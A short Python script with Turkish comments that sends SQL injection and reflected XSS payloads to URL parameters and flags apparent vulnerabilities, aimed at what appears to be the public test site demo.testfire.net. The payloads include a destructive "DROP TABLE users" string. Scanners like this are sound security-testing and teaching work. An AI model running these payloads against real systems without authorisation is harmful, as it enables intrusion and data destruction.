import requests

def sqli_test(url):
    """
    Verilen URL'e SQL Injection saldırısı simüle eder.
    Hata mesajlarında SQL anahtar kelimeleri arar.
    
    Parametreler:
        url (str): Test edilecek web adresi
    
    Döndürür:
        sonuclar (list): Bulunan açıkların listesi
    """
    payloadlar = ["'", "' OR '1'='1", "'; DROP TABLE users;--"]
    sonuclar = []
    
    for payload in payloadlar:
        hedef = f"{url}?id={payload}"
        try:
            cevap = requests.get(hedef, timeout=5)
            if any(hata in cevap.text.lower() for hata in ["sql", "syntax", "mysql", "error"]):
                print(f"  [!] SQLi açığı bulundu! Payload: {payload}")
                sonuclar.append({"tur": "SQLi", "detay": payload})
            else:
                print(f"  [✓] Temiz: {payload}")
        except:
            print(f"  [!] Bağlantı hatası: {hedef}")
    
    return sonuclar

def xss_test(url):
    """
    Verilen URL'e XSS saldırısı simüle eder.
    Gönderilen payload'ın cevap içinde aynen dönüp dönmediğini kontrol eder.
    
    Parametreler:
        url (str): Test edilecek web adresi
    
    Döndürür:
        sonuclar (list): Bulunan açıkların listesi
    """
    payloadlar = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"]
    sonuclar = []
    
    for payload in payloadlar:
        hedef = f"{url}?q={payload}"
        try:
            cevap = requests.get(hedef, timeout=5)
            if payload in cevap.text:
                print(f"  [!] XSS açığı bulundu! Payload: {payload}")
                sonuclar.append({"tur": "XSS", "detay": payload})
            else:
                print(f"  [✓] Temiz: {payload}")
        except:
            print(f"  [!] Bağlantı hatası")
    
    return sonuclar

if __name__ == "__main__":
    sqli_test("http://demo.testfire.net/bank/login.aspx")
    xss_test("http://demo.testfire.net/search.aspx")